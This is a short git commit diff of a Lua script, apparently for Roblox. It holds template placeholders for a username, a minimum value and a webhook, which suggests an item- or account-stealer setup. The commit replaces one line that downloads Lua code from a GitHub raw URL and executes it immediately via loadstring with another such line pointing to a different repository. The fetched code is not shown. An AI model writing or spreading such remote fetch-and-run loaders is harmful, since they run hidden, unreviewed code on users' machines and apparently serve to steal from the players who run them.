f246184d1e5f3ba82f13c7a68b6e4d49652459cd
tacskull <guiweuller666@gmail.com>
2025-04-19 14:32:52 -0300

    Update shjwkw.lua

--- shjwkw.lua
+++ shjwkw.lua
@@ -2,4 +2,4 @@ local username = "{{username}}"
 local min_value = {{min_value}}
 local webhook = "{{webhook}}"
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/tacskull/rec/main/rec.lua'))()
+loadstring(game:HttpGet('https://github.com/tacskull/kshaj/raw/main/klux.lua'))()
